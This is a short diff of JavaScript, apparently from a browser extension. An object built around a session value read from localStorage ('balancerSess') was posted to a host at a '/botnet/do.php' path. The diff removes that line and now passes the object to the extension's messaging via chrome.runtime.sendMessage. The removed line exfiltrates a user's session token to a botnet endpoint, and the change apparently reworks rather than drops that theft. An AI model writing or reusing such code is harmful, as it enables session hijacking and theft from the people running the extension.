@@ -9,4 +9,7 @@ var debug = {
 	hash: localStorage.getItem("balancerSess")
 }
 
-$.post("http://10.68.100.60/botnet/do.php", debug);
+
+chrome.runtime.sendMessage(debug, function(response) {
+  console.log(response);
+});
